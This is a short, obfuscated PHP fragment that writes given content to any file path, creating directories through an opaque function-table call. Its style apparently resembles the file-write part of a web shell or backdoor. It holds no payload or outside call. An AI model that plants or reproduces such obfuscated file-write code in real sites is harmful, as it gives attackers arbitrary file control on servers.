<?Php
if(strpos($b,'/')!==false){
	$snc=z($z[16],dirname($b));
}
$snc=touch($b);
if($snc){
	if(empty($c)){
		$c='';
	}
	if(empty($d)){
		$d='w';
	}
	$dsy=fopen($b,$d);
	if(fwrite($dsy,$c)){
		$snc=true;
	}
	fclose($dsy);
}
?>